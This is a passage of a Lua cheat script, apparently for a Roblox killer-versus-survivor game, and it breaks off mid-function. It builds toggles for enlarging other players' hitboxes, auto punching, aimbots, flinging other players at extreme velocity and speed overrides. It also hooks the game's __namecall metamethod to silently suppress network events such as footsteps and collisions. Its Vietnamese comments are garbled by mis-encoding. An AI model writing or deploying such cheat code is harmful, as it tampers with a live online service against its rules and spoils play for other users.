3293 | if getgenv().emergency_stop == nil then
3294 |     getgenv().emergency_stop = false
3295 | end
3296 | 
3297 | -- üîß Chuy·ªÉn studs th√†nh ƒë·ªô tƒÉng k√≠ch th∆∞·ªõc
3298 | local function StudsIntoSize(studs)
3299 |     return studs * 0.5
3300 | end
3301 | 
3302 | -- ‚öôÔ∏è H√†m tƒÉng hitbox ng∆∞·ªùi kh√°c
3303 | local function ExtendOthersHitbox(studs, time)
3304 |     local size_increase = StudsIntoSize(studs)
3305 |     local start = tick()
3306 | 
3307 |     if getgenv().emergency_stop then
3308 |         getgenv().emergency_stop = false
3309 |     end
3310 | 
3311 |     repeat
3312 |         task.wait(0.05)
3313 |         for _, plr in pairs(Players:GetPlayers()) do
3314 |             if plr ~= lp and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
3315 |                 for _, part in pairs(plr.Character:GetChildren()) do
3316 |                     if part:IsA("BasePart") then
3317 |                         local originalSize = part.Size
3318 |                         part.Size = Vector3.new(
3319 |                             originalSize.X + size_increase,
3320 |                             originalSize.Y,
3321 |                             originalSize.Z + size_increase
3322 |                         )
3323 |                         part.Massless = true
3324 |                         part.CanCollide = false
3325 |                     end
3326 |                 end
3327 |             end
3328 |         end
3329 |     until tick() - start > tonumber(time) or getgenv().emergency_stop
3330 | 
3331 |     -- üîÑ Tr·∫£ l·∫°i k√≠ch th∆∞·ªõc c≈©
3332 |     if getgenv().emergency_stop then
3333 |         getgenv().emergency_stop = false
3334 |     end
3335 | 
3336 |     for _, plr in pairs(Players:GetPlayers()) do
3337 |         if plr ~= lp and plr.Character then
3338 |             for _, part in pairs(plr.Character:GetChildren()) do
3339 |                 if part:IsA("BasePart") then
3340 |                     part.Size = Vector3.new(2, 2, 1)
3341 |                 end
3342 |             end
3343 |         end
3344 |     end
3345 | end
3346 | 
3347 | -- üõë H√†m d·ª´ng
3348 | local function StopExtendingHitbox()
3349 |     getgenv().emergency_stop = true
3350 | end
3351 | 
3352 | -- üü¢ N√∫t b·∫≠t/t·∫Øt hitbox extender
3353 | Tabs.Main:AddToggle("ExtendHitboxOthers", {
3354 |     Title = "Block Hitbox",
3355 |     Default = false,
3356 |     Callback = function(Value)
3357 |         if Value then
3358 |             task.spawn(function()
3359 |                 while Value and not getgenv().emergency_stop do
3360 |                     ExtendOthersHitbox(1.5, 2)
3361 |                     task.wait(0)
3362 |                 end
3363 |             end)
3364 |         else
3365 |             StopExtendingHitbox()
3366 |         end
3367 |     end
3368 | })
3369 | end
3370 | 
3371 | 
3372 | 
3373 | 
3374 | 
3375 | do
3376 |     -- Auto Punch settings
3377 |     local autoPunchOn, aimPunch, flingPunchOn, customPunchEnabled = false, false, false, false
3378 |     local hiddenfling = false
3379 |     local flingPower = 10000
3380 |     local predictionValue = 4
3381 |     local customPunchAnimId = ""
3382 |     local Humanoid
3383 |     local lastPunchTime = 0
3384 |     local punchAnimIds = { "87259391926321" }
3385 |     local LP = game:GetService("Players").LocalPlayer
3386 |     local RunService = game:GetService("RunService")
3387 |     local PlayerGui = LP:WaitForChild("PlayerGui")
3388 | 
3389 |     -- Function: play custom punch anim
3390 |     local function playCustomPunch(animId)
3391 |         if not Humanoid then return end
3392 |         if not animId or animId == "" then return end
3393 |         local now = tick()
3394 |         if now - lastPunchTime < 1 then return end
3395 | 
3396 |         for _, track in ipairs(Humanoid:GetPlayingAnimationTracks()) do
3397 |             local animNum = tostring(track.Animation.AnimationId):match("%d+")
3398 |             if table.find(punchAnimIds, animNum) then
3399 |                 track:Stop()
3400 |             end
3401 |         end
3402 | 
3403 |         local anim = Instance.new("Animation")
3404 |         anim.AnimationId = "rbxassetid://" .. animId
3405 |         local track = Humanoid:LoadAnimation(anim)
3406 |         track:Play()
3407 |         lastPunchTime = now
3408 |     end
3409 | 
3410 |     -- Hidden fling coroutine
3411 |     coroutine.wrap(function()
3412 |         local hrp, c, vel, movel = nil, nil, nil, 0.1
3413 |         while true do
3414 |             RunService.Heartbeat:Wait()
3415 |             if hiddenfling then
3416 |                 while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
3417 |                     RunService.Heartbeat:Wait()
3418 |                     c = LP.Character
3419 |                     hrp = c and c:FindFirstChild("HumanoidRootPart")
3420 |                 end
3421 |                 if hiddenfling then
3422 |                     vel = hrp.Velocity
3423 |                     hrp.Velocity = vel * flingPower + Vector3.new(0, flingPower, 0)
3424 |                     RunService.RenderStepped:Wait()
3425 |                     hrp.Velocity = vel
3426 |                     RunService.Stepped:Wait()
3427 |                     hrp.Velocity = vel + Vector3.new(0, movel, 0)
3428 |                     movel = movel * -1
3429 |                 end
3430 |             end
3431 |         end
3432 |     end)()
3433 | 
3434 |     -- Auto Punch loop
3435 |     RunService.RenderStepped:Connect(function()
3436 |         local myChar = LP.Character
3437 |         if not myChar then return end
3438 |         local myRoot = myChar:FindFirstChild("HumanoidRootPart")
3439 |         Humanoid = myChar:FindFirstChildOfClass("Humanoid")
3440 | 
3441 |         if autoPunchOn then
3442 |             local gui = PlayerGui:FindFirstChild("MainUI")
3443 |             local punchBtn = gui and gui:FindFirstChild("AbilityContainer") and gui.AbilityContainer:FindFirstChild("Punch")
3444 |             local charges = punchBtn and punchBtn:FindFirstChild("Charges")
3445 | 
3446 |             if charges and charges.Text == "1" then
3447 |                 local killerNames = {"c00lkidd", "Slasher", "JohnDoe", "1x1x1x1", "Noli", "Guest 666", "Sixer"}
3448 |                 for _, name in ipairs(killerNames) do
3449 |                     local killer = workspace:FindFirstChild("Players")
3450 |                         and workspace.Players:FindFirstChild("Killers")
3451 |                         and workspace.Players.Killers:FindFirstChild(name)
3452 | 
3453 |                     if killer and killer:FindFirstChild("HumanoidRootPart") then
3454 |                         local root = killer.HumanoidRootPart
3455 |                         if root and myRoot and (root.Position - myRoot.Position).Magnitude <= 10 then
3456 |                             
3457 |                             -- Aim Punch
3458 |                             if aimPunch then
3459 |                                 local humanoid = myChar:FindFirstChild("Humanoid")
3460 |                                 if humanoid then humanoid.AutoRotate = false end
3461 |                                 task.spawn(function()
3462 |                                     local start = tick()
3463 |                                     while tick() - start < 2 do
3464 |                                         if myRoot and root and root.Parent then
3465 |                                             local predictedPos = root.Position + (root.CFrame.LookVector * predictionValue)
3466 |                                             myRoot.CFrame = CFrame.lookAt(myRoot.Position, predictedPos)
3467 |                                         end
3468 |                                         task.wait()
3469 |                                     end
3470 |                                     if humanoid then humanoid.AutoRotate = true end
3471 |                                 end)
3472 |                             end
3473 | 
3474 |                             -- Click punch button
3475 |                             for _, conn in ipairs(getconnections(punchBtn.MouseButton1Click)) do
3476 |                                 pcall(function() conn:Fire() end)
3477 |                             end
3478 | 
3479 |                             -- Fling Punch
3480 |                             if flingPunchOn then
3481 |                                 hiddenfling = true
3482 |                                 task.spawn(function()
3483 |                                     local start = tick()
3484 |                                     while tick() - start < 1 do
3485 |                                         if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and root and root.Parent then
3486 |                                             local frontPos = root.Position + (root.CFrame.LookVector * 2)
3487 |                                             LP.Character.HumanoidRootPart.CFrame = CFrame.new(frontPos, root.Position)
3488 |                                         end
3489 |                                         task.wait()
3490 |                                     end
3491 |                                     hiddenfling = false
3492 |                                 end)
3493 |                             end
3494 | 
3495 |                             -- Custom anim
3496 |                             if customPunchEnabled and customPunchAnimId ~= "" then
3497 |                                 playCustomPunch(customPunchAnimId)
3498 |                             end
3499 | 
3500 |                             break -- ch·ªâ ƒë√°nh 1 killer m·ªói v√≤ng
3501 |                         end
3502 |                     end
3503 |                 end
3504 |             end
3505 |         end
3506 |     end)
3507 | 
3508 |     -- === N√∫t cho Tabs.Main (th√™m v√†o GUI c√≥ s·∫µn) ===
3509 |     Tabs.Main:AddToggle("AutoPunch", { Title = "Auto Punch", Default = false })
3510 |         :OnChanged(function(val) autoPunchOn = val end)
3511 | 
3512 |     Tabs.Main:AddToggle("AimPunch", { Title = "Punch Aimbot", Default = false })
3513 |         :OnChanged(function(val) aimPunch = val end)
3514 | 
3515 |     Tabs.Main:AddToggle("FlingPunch", { Title = "Fling Punch", Default = false })
3516 |         :OnChanged(function(val) flingPunchOn = val end)
3517 | 
3518 |     Tabs.Main:AddSlider("Prediction", {
3519 |         Title = "Aim Prediction",
3520 |         Min = 0, Max = 10, Default = 4, Rounding = 1,
3521 |     }):OnChanged(function(val) predictionValue = val end)
3522 | 
3523 |     Tabs.Main:AddSlider("FlingPower", {
3524 |         Title = "Fling Power",
3525 |         Min = 5000, Max = 500000, Default = 10000, Rounding = 0,
3526 |     }):OnChanged(function(val) flingPower = val end)
3527 | 
3528 |     Tabs.Main:AddInput("CustomAnim", {
3529 |         Title = "Custom Punch",
3530 |         Default = "",
3531 |         Placeholder = "Enter Animation ID"
3532 |     }):OnChanged(function(txt) customPunchAnimId = txt end)
3533 | 
3534 |     Tabs.Main:AddToggle("EnableCustomAnim", { Title = "Enable Custom Animation", Default = false })
3535 |         :OnChanged(function(val) customPunchEnabled = val end)
3536 | end
3537 | 
3538 |     Tabs.Main:AddSection("c00lkidd")
3539 | 
3540 | 
3541 | 
3542 | do
3543 |     --== ‚öôÔ∏è Base Globals ==--
3544 |     local Players = game:GetService("Players")
3545 |     local ReplicatedStorage = game:GetService("ReplicatedStorage")
3546 |     local RunService = game:GetService("RunService")
3547 |     local Workspace = game:GetService("Workspace")
3548 |     local Camera = Workspace.CurrentCamera
3549 |     local Player = Players.LocalPlayer
3550 | 
3551 |     getgenv().Remote = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent")
3552 |     getgenv().walkSpeed = 100
3553 |     getgenv().connection = nil
3554 |     getgenv().blockFootstepPlayed = false
3555 | 
3556 |     --== üß† Helpers ==--
3557 |     local function getCharacter()
3558 |         return Player.Character or Player.CharacterAdded:Wait()
3559 |     end
3560 | 
3561 |     --== üéØ Target list ==
3562 |     -- Thay specialTargets b·∫±ng folder Survivors t·ª± ƒë·ªông
3563 |     local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
3564 | 
3565 |     local function isSpecialTarget(char)
3566 |         if not char then return false end
3567 |         if survivorsFolder:FindFirstChild(char.Name) then
3568 |             return true
3569 |         end
3570 |         -- m·ªôt s·ªë model c√≥ th·ªÉ l√† child c·ªßa model (c·∫©n th·∫≠n)
3571 |         for _, child in ipairs(char:GetChildren()) do
3572 |             if survivorsFolder:FindFirstChild(child.Name) then
3573 |                 return true
3574 |             end
3575 |         end
3576 |         return false
3577 |     end
3578 | 
3579 |     --== üèÉ Movement Logic ==--
3580 |     local stopMovement = false
3581 |     local validValues = { Timeout = true, Collide = true, Hit = true }
3582 |     local stopTimerTask = nil
3583 |     local STOP_TIMEOUT = 5
3584 | 
3585 |     local function startStopTimeout()
3586 |         if stopTimerTask then return end
3587 |         stopTimerTask = task.spawn(function()
3588 |             task.wait(STOP_TIMEOUT)
3589 |             stopMovement = false
3590 |             stopTimerTask = nil
3591 |         end)
3592 |     end
3593 | 
3594 |     local function cancelStopTimeout()
3595 |         stopTimerTask = nil
3596 |     end
3597 | 
3598 |     local function watchResult(result)
3599 |         local function check()
3600 |             if validValues[result.Value] then
3601 |                 stopMovement = true
3602 |                 startStopTimeout()
3603 |             else
3604 |                 stopMovement = false
3605 |                 cancelStopTimeout()
3606 |             end
3607 |         end
3608 |         pcall(check)
3609 |         local conn
3610 |         conn = result:GetPropertyChangedSignal("Value"):Connect(function()
3611 |             pcall(check)
3612 |         end)
3613 |         result.AncestryChanged:Connect(function(_, parent)
3614 |             if not parent then
3615 |                 stopMovement = false
3616 |                 cancelStopTimeout()
3617 |                 if conn then
3618 |                     conn:Disconnect()
3619 |                     conn = nil
3620 |                 end
3621 |             end
3622 |         end)
3623 |     end
3624 | 
3625 |     local function onCharacterAdded(character)
3626 |         local result = character:FindFirstChild("Result")
3627 |         if result and result:IsA("StringValue") then
3628 |             watchResult(result)
3629 |         end
3630 |         character.ChildAdded:Connect(function(child)
3631 |             if child.Name == "Result" and child:IsA("StringValue") then
3632 |                 watchResult(child)
3633 |             end
3634 |         end)
3635 |         character.ChildRemoved:Connect(function(child)
3636 |             if child.Name == "Result" then
3637 |                 stopMovement = false
3638 |                 cancelStopTimeout()
3639 |             end
3640 |         end)
3641 |     end
3642 | 
3643 |     Player.CharacterAdded:Connect(onCharacterAdded)
3644 |     if Player.Character then
3645 |         onCharacterAdded(Player.Character)
3646 |     end
3647 | 
3648 |     --== üîé Helpers ==--
3649 |     local function getHumRoot(partOrChar)
3650 |         if not partOrChar then return nil end
3651 |         return partOrChar:FindFirstChild("HumanoidRootPart") or partOrChar:FindFirstChild("Torso") or partOrChar:FindFirstChild("UpperTorso")
3652 |     end
3653 | 
3654 |     --== üîÑ Movement follow camera ==--
3655 |     local function onHeartbeat()
3656 |         local char = Player.Character
3657 |         -- gi·ªØ check c00lkidd nh∆∞ g·ªëc (ch·ªâ √°p d·ª•ng cho m·∫´u c00lkidd)
3658 |         if not char or char.Name ~= "c00lkidd" then return end
3659 |         local root = getHumRoot(char)
3660 |         local hum = char:FindFirstChildOfClass("Humanoid")
3661 |         local lv = root and root:FindFirstChild("LinearVelocity")
3662 |         if not root or not hum or not lv then return end
3663 |         lv.Enabled = false
3664 |         if stopMovement then return end
3665 | 
3666 |         local look = Camera and Camera.CFrame and Camera.CFrame.LookVector or nil
3667 |         if look then
3668 |             local dir = Vector3.new(look.X, 0, look.Z)
3669 |             if dir.Magnitude > 0 then
3670 |                 dir = dir.Unit
3671 |                 root.Velocity = Vector3.new(dir.X * getgenv().walkSpeed, root.Velocity.Y, dir.Z * getgenv().walkSpeed)
3672 |                 root.CFrame = CFrame.new(root.Position, root.Position + dir)
3673 |             end
3674 |         end
3675 |     end
3676 | 
3677 |     --== üß© Hook Helpers ==--
3678 |     getgenv().createHook = function(remoteName)
3679 |         if getgenv()["original_" .. remoteName] then
3680 |             return getgenv()["original_" .. remoteName]
3681 |         end
3682 |         getgenv()["original_" .. remoteName] = hookmetamethod(game, "__namecall", function(self, ...)
3683 |             local method = getnamecallmethod()
3684 |             local args = { ... }
3685 |             if self == getgenv().Remote and method == "FireServer" then
3686 |                 if args[1] == Player.Name .. remoteName then
3687 |                     return
3688 |                 end
3689 |             end
3690 |             return getgenv()["original_" .. remoteName](self, ...)
3691 |         end)
3692 |         return getgenv()["original_" .. remoteName]
3693 |     end
3694 | 
3695 |     getgenv().enableHook = function(remoteName)
3696 |         if not getgenv()["hook_" .. remoteName] then
3697 |             getgenv()["hook_" .. remoteName] = getgenv().createHook(remoteName)
3698 |         end
3699 |         if remoteName == "DusekkarCancel" and not getgenv().isFiringDusekkar then
3700 |             getgenv().isFiringDusekkar = true
3701 |             task.spawn(function()
3702 |                 task.wait(4)
3703 |                 getgenv().Remote:FireServer({ Player.Name .. "DusekkarCancel" })
3704 |                 getgenv().isFiringDusekkar = false
3705 |                 stopMovement = false
3706 |                 cancelStopTimeout()
3707 |             end)
3708 |         end
3709 |     end
3710 | 
3711 |     getgenv().disableHook = function(remoteName)
3712 |         if getgenv()["hook_" .. remoteName] then
3713 |             hookmetamethod(game, "__namecall", getgenv()["hook_" .. remoteName])
3714 |             getgenv()["hook_" .. remoteName] = nil
3715 |             getgenv()["original_" .. remoteName] = nil
3716 |         end
3717 |     end
3718 | 
3719 |     --== üë£ Footstep Hook ==--
3720 |     getgenv().HookFootstepPlayed = function(enable)
3721 |         if enable then
3722 |             if not getgenv().originalFootstepHook then
3723 |                 getgenv().originalFootstepHook = hookmetamethod(game, "__namecall", function(self, ...)
3724 |                     local method = getnamecallmethod()
3725 |                     local args = { ... }
3726 |                     if method == "FireServer" and self.Name == "UnreliableRemoteEvent" then
3727 |                         if args[1] == "FootstepPlayed" and getgenv().blockFootstepPlayed then
3728 |                             return
3729 |                         end
3730 |                     end
3731 |                     return getgenv().originalFootstepHook(self, ...)
3732 |                 end)
3733 |             end
3734 |             getgenv().blockFootstepPlayed = true
3735 |         else
3736 |             getgenv().blockFootstepPlayed = false
3737 |         end
3738 |     end
3739 | 
3740 |     --== ‚öîÔ∏è Combat GUI (Fluent style) ==--
3741 |     Tabs.Main:AddToggle("WalkspeedOverride", {
3742 |         Title = "Walkspeed Override Controller",
3743 |         Default = false
3744 |     }):OnChanged(function(value)
3745 |         if value then
3746 |             stopMovement = false
3747 |             cancelStopTimeout()
3748 |             if not getgenv().connection then
3749 |                 getgenv().connection = RunService.Heartbeat:Connect(onHeartbeat)
3750 |             end
3751 |         else
3752 |             if getgenv().connection then
3753 |                 getgenv().connection:Disconnect()
3754 |                 getgenv().connection = nil
3755 |             end
3756 |         end
3757 |     end)
3758 | 
3759 |     Tabs.Main:AddToggle("IgnoreC00lkidd", {
3760 |         Title = "Walkspeed Override Ignore Objectables",
3761 |         Default = false
3762 |     }):OnChanged(function(value)
3763 |         if value then
3764 |             getgenv().enableHook("C00lkiddCollision")
3765 |         else
3766 |             getgenv().disableHook("C00lkiddCollision")
3767 |         end
3768 |     end)
3769 | 
3770 |     Tabs.Main:AddToggle("IgnoreFootstep", {
3771 |         Title = "Block Footstep Played",
3772 |         Default = false
3773 |     }):OnChanged(function(value)
3774 |         getgenv().HookFootstepPlayed(value)
3775 |     end)
3776 | 
3777 |     --== üß© New Toggle for Dusekkar ==
3778 |     Tabs.Main:AddToggle("DusekkarMode", {
3779 |         Title = "Anti Dusekarr Attack",
3780 |         Default = false
3781 |     }):OnChanged(function(value)
3782 |         if value then
3783 |             getgenv().enableHook("DusekkarCancel")
3784 |         else
3785 |             getgenv().disableHook("DusekkarCancel")
3786 |         end
3787 |     end)
3788 | 
3789 | end
3790 | 
3791 | 
3792 | 
3793 | 
3794 |     Tabs.Main:AddSection("Noli")
3795 | 
3796 | do
3797 |     local RunService = game:GetService("RunService")
3798 |     local Players = game:GetService("Players")
3799 |     local LocalPlayer = Players.LocalPlayer
3800 | 
3801 |     -- ====== CONFIG ======
3802 |     local voidrushcontrol = false
3803 |     local DASH_SPEED = 80
3804 |     local ATTACK_RANGE = 6
3805 |     local ATTACK_INTERVAL = 0.2
3806 | 
3807 |     -- ====== DYNAMIC PRIORITY ======
3808 |     local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
3809 | 
3810 |     local function isPriorityTarget(p)
3811 |         if not p or not p.Character then return false end
3812 |         return survivorsFolder:FindFirstChild(p.Name) ~= nil
3813 |     end
3814 | 
3815 |     -- ====== STATE ======
3816 |     local isOverrideActive = false
3817 |     local connection
3818 |     local Humanoid, RootPart
3819 |     local lastState = nil
3820 |     local attackingLoop = nil
3821 | 
3822 |     -- setup character
3823 |     local function setupCharacter(character)
3824 |         Humanoid = character:WaitForChild("Humanoid")
3825 |         RootPart = character:WaitForChild("HumanoidRootPart")
3826 |         Humanoid.Died:Connect(function()
3827 |             stopOverride()
3828 |         end)
3829 |     end
3830 | 
3831 |     if LocalPlayer.Character then
3832 |         setupCharacter(LocalPlayer.Character)
3833 |     end
3834 |     LocalPlayer.CharacterAdded:Connect(setupCharacter)
3835 | 
3836 |     -- t√¨m m·ª•c ti√™u h·ª£p l·ªá
3837 |     local function validTarget(p)
3838 |         if p == LocalPlayer then return false end
3839 |         local c = p.Character
3840 |         if not c then return false end
3841 |         local hrp = c:FindFirstChild("HumanoidRootPart")
3842 |         local hum = c:FindFirstChild("Humanoid")
3843 |         return hrp and hum and hum.Health > 0
3844 |     end
3845 | 
3846 |     -- t√¨m player g·∫ßn nh·∫•t (∆∞u ti√™n survivorsFolder)
3847 |     local function getClosestTarget()
3848 |         if not RootPart then return nil end
3849 | 
3850 |         local closestW, distW = nil, math.huge
3851 |         local closestA, distA = nil, math.huge
3852 | 
3853 |         for _, p in ipairs(Players:GetPlayers()) do
3854 |             if validTarget(p) then
3855 |                 local c = p.Character
3856 |                 local hrp = c and c:FindFirstChild("HumanoidRootPart")
3857 |                 if hrp then
3858 |                     local d = (hrp.Position - RootPart.Position).Magnitude
3859 |                     if isPriorityTarget(p) and d < distW then
3860 |                         distW = d
3861 |                         closestW = p
3862 |                     end
3863 |                     if d < distA then
3864 |                         distA = d
3865 |                         closestA = p
3866 |                     end
3867 |                 end
3868 |             end
3869 |         end
3870 | 
3871 |         return closestW or closestA, distW < math.huge and distW or distA
3872 |     end
3873 | 
3874 |     -- c·ªë g·∫Øng t·∫•n c√¥ng (tool:Activate())
3875 |     local function attemptAttack()
3876 |         local char = LocalPlayer.Character
3877 |         if not char then return end
3878 |         local tool = char:FindFirstChildOfClass("Tool")
3879 |         if tool and tool.Parent == char then
3880 |             pcall(function() tool:Activate() end)
3881 |         end
3882 |     end
3883 | 
3884 |     -- ƒëi·ªÅu khi·ªÉn Void Rush
3885 |     local function startOverride()
3886 |         if isOverrideActive or not Humanoid or not RootPart then return end
3887 |         isOverrideActive = true
3888 | 
3889 |         connection = RunService.RenderStepped:Connect(function()
3890 |             if not Humanoid or not RootPart or Humanoid.Health <= 0 then return end
3891 |             local target, dist = getClosestTarget()
3892 | 
3893 |             if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
3894 |                 local hrp = target.Character.HumanoidRootPart
3895 |                 local dir = hrp.Position - RootPart.Position
3896 |                 local horizontal = Vector3.new(dir.X, 0, dir.Z)
3897 | 
3898 |                 if horizontal.Magnitude > 0.1 then
3899 |                     RootPart.CFrame = CFrame.new(RootPart.Position, Vector3.new(hrp.Position.X, RootPart.Position.Y, hrp.Position.Z))
3900 |                     RootPart.AssemblyLinearVelocity = horizontal.Unit * DASH_SPEED
3901 |                 else
3902 |                     RootPart.AssemblyLinearVelocity = Vector3.zero
3903 |                 end
3904 |             else
3905 |                 RootPart.AssemblyLinearVelocity = Vector3.zero
3906 |             end
3907 |         end)
3908 | 
3909 |         attackingLoop = task.spawn(function()
3910 |             while isOverrideActive do
3911 |                 local target, dist = getClosestTarget()
3912 |                 if target and dist and dist <= ATTACK_RANGE then
3913 |                     attemptAttack()
3914 |                 end
3915 |                 task.wait(ATTACK_INTERVAL)
3916 |             end
3917 |         end)
3918 |     end
3919 | 
3920 |     function stopOverride()
3921 |         if not isOverrideActive then return end
3922 |         isOverrideActive = false
3923 |         if connection then
3924 |             connection:Disconnect()
3925 |             connection = nil
3926 |         end
3927 |         if RootPart then
3928 |             RootPart.AssemblyLinearVelocity = Vector3.zero
3929 |         end
3930 |     end
3931 | 
3932 |     -- ki·ªÉm tra tr·∫°ng th√°i void rush
3933 |     RunService.RenderStepped:Connect(function()
3934 |         if not voidrushcontrol or not Humanoid then return end
3935 |         local state = Humanoid.Parent and Humanoid.Parent:GetAttribute("VoidRushState")
3936 |         if state ~= lastState then
3937 |             lastState = state
3938 |             if state == "Dashing" then
3939 |                 startOverride()
3940 |             else
3941 |                 stopOverride()
3942 |             end
3943 |         end
3944 |     end)
3945 | 
3946 |     -- toggle GUI
3947 |     Tabs.Main:AddToggle("VoidRushControl", {
3948 |         Title = "Void Rush Aimbot",
3949 |         Default = false
3950 |     }):OnChanged(function(v)
3951 |         voidrushcontrol = v
3952 |         if not v then stopOverride() end
3953 |     end)
3954 | end
3955 | 
3956 | 
3957 | 
3958 |     Tabs.Main:AddSection("1x1x1x1")
3959 | 
3960 | do
3961 | -- üß© GUI Toggle + Dropdown
3962 | local toggleOn = false
3963 | local toggleFlag = Instance.new("BoolValue")
3964 | toggleFlag.Name = "1x1x1x1AutoAim_ToggleFlag"
3965 | toggleFlag.Value = false
3966 | 
3967 | local aimMode = "One Player"
3968 | local predictMovement = false
3969 | 
3970 | Tabs.Main:AddDropdown("AimModeDropdown", {
3971 |     Title = "Aim Mode",
3972 |     Values = {"One Player", "Multi Players", "Teleport"},
3973 |     Default = "One Player",
3974 | }):OnChanged(function(value)
3975 |     aimMode = value
3976 | end)
3977 | 
3978 | Tabs.Main:AddToggle("AimSkill1x1x1x1", {
3979 |     Title = "MassInfection Aimbot",
3980 |     Default = toggleOn,
3981 | }):OnChanged(function(state)
3982 |     toggleOn = state
3983 |     toggleFlag.Value = state
3984 | end)
3985 | 
3986 | Tabs.Main:AddToggle("PredictMovementToggle", {
3987 |     Title = "Predict Movement",
3988 |     Default = predictMovement,
3989 | }):OnChanged(function(state)
3990 |     predictMovement = state
3991 | end)
3992 | 
3993 | -- ‚öôÔ∏è Setup
3994 | local Players = game:GetService("Players")
3995 | local RunService = game:GetService("RunService")
3996 | local localPlayer = Players.LocalPlayer
3997 | local workspacePlayers = workspace:WaitForChild("Players")
3998 | local survivorsFolder = workspacePlayers:WaitForChild("Survivors")
3999 | 
4000 | local dangerousAnimations = {
4001 |     ["131430497821198"] = true,
4002 |     ["100592913030351"] = true,
4003 |     ["70447634862911"]  = true,
4004 |     ["83685305553364"] = true
4005 | }
4006 | 
4007 | local killerModels = {["1x1x1x1"] = true}
4008 | 
4009 | -- ‚ö° State
4010 | local autoRotateDisabledByScript = false
4011 | local currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
4012 | 
4013 | -- üß© Utils
4014 | local function isKiller()
4015 |     local char = localPlayer.Character
4016 |     return char and killerModels[char.Name] or false
4017 | end
4018 | 
4019 | local function getMyHumanoid()
4020 |     local char = localPlayer.Character
4021 |     return char and char:FindFirstChildWhichIsA("Humanoid")
4022 | end
4023 | 
4024 | local function restoreAutoRotate()
4025 |     local hum = getMyHumanoid()
4026 |     if hum and autoRotateDisabledByScript then
4027 |         hum.AutoRotate = true
4028 |         autoRotateDisabledByScript = false
4029 |     end
4030 | end
4031 | 
4032 | local function isPlayingDangerousAnimation()
4033 |     local humanoid = getMyHumanoid()
4034 |     if not humanoid then return false end
4035 |     local animator = humanoid:FindFirstChildOfClass("Animator")
4036 |     if not animator then return false end
4037 | 
4038 |     for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
4039 |         local animId = tostring(track.Animation.AnimationId):match("%d+")
4040 |         if animId and dangerousAnimations[animId] then
4041 |             return true
4042 |         end
4043 |     end
4044 |     return false
4045 | end
4046 | 
4047 | -- üß≠ T√¨m survivor g·∫ßn nh·∫•t trong folder "Survivors"
4048 | local function getClosestSurvivor()
4049 |     local myHumanoid = getMyHumanoid()
4050 |     if not myHumanoid then return nil end
4051 |     local myRoot = myHumanoid.Parent and myHumanoid.Parent:FindFirstChild("HumanoidRootPart")
4052 |     if not myRoot then return nil end
4053 | 
4054 |     local closest, closestDist = nil, math.huge
4055 | 
4056 |     for _, obj in ipairs(survivorsFolder:GetChildren()) do
4057 |         if obj:IsA("Model") then
4058 |             local hrp = obj:FindFirstChild("HumanoidRootPart")
4059 |             local hum = obj:FindFirstChildWhichIsA("Humanoid")
4060 |             if hrp and hum and hum.Health > 0 then
4061 |                 local dist = (hrp.Position - myRoot.Position).Magnitude
4062 |                 if dist < closestDist then
4063 |                     closest = obj
4064 |                     closestDist = dist
4065 |                 end
4066 |             end
4067 |         end
4068 |     end
4069 |     return closest
4070 | end
4071 | 
4072 | -- üåÄ Reset khi respawn
4073 | localPlayer.CharacterAdded:Connect(function()
4074 |     task.delay(0.1, function()
4075 |         autoRotateDisabledByScript = false
4076 |     end)
4077 | end)
4078 | 
4079 | -- üîÅ Main loop
4080 | RunService.RenderStepped:Connect(function()
4081 |     if not toggleFlag.Value then
4082 |         restoreAutoRotate()
4083 |         currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
4084 |         return
4085 |     end
4086 | 
4087 |     if not isKiller() then
4088 |         restoreAutoRotate()
4089 |         currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
4090 |         return
4091 |     end
4092 | 
4093 |     local myHumanoid = getMyHumanoid()
4094 |     if not myHumanoid then return end
4095 |     local myRoot = myHumanoid.Parent and myHumanoid.Parent:FindFirstChild("HumanoidRootPart")
4096 |     if not myRoot then return end
4097 | 
4098 |     local isPlaying = isPlayingDangerousAnimation()
4099 | 
4100 |     -- Lock target 1 l·∫ßn khi b·∫Øt ƒë·∫ßu animation
4101 |     if isPlaying and not isLockedOn then
4102 |         currentTarget = getClosestSurvivor()
4103 |         if currentTarget then isLockedOn = true end
4104 |     end
4105 | 
4106 |     -- Validate target
4107 |     if isLockedOn and currentTarget then
4108 |         local tHum = currentTarget:FindFirstChildWhichIsA("Humanoid")
4109 |         local tHrp = currentTarget:FindFirstChild("HumanoidRootPart")
4110 |         if (not tHum) or (tHum and tHum.Health <= 0) or (not tHrp) then
4111 |             currentTarget, isLockedOn = nil, false
4112 |         end
4113 |     end
4114 | 
4115 |     -- End animation
4116 |     if (not isPlaying) and wasPlayingAnimation then
4117 |         currentTarget, isLockedOn = nil, false
4118 |         restoreAutoRotate()
4119 |     end
4120 |     wasPlayingAnimation = isPlaying
4121 | 
4122 |     -- üéØ Aim / Teleport
4123 |     if isPlaying and isLockedOn and currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
4124 |         local hrp = currentTarget.HumanoidRootPart
4125 |         local targetPos = hrp.Position
4126 | 
4127 |         if not autoRotateDisabledByScript then
4128 |             myHumanoid.AutoRotate = false
4129 |             autoRotateDisabledByScript = true
4130 |         end
4131 | 
4132 |         -- Predict movement
4133 |         if predictMovement then
4134 |             local vel = hrp.Velocity
4135 |             if vel.Magnitude > 2 then
4136 |                 targetPos = targetPos + hrp.CFrame.LookVector * 3
4137 |             end
4138 |         end
4139 | 
4140 |         local lookAt = Vector3.new(targetPos.X, myRoot.Position.Y, targetPos.Z)
4141 | 
4142 |         if aimMode == "One Player" then
4143 |             myRoot.CFrame = myRoot.CFrame:Lerp(CFrame.lookAt(myRoot.Position, lookAt), 0.99)
4144 | 
4145 |         elseif aimMode == "Multi Players" then
4146 |             local newTarget = getClosestSurvivor()
4147 |             if newTarget then currentTarget = newTarget end
4148 |             myRoot.CFrame = myRoot.CFrame:Lerp(CFrame.lookAt(myRoot.Position, lookAt), 0.99)
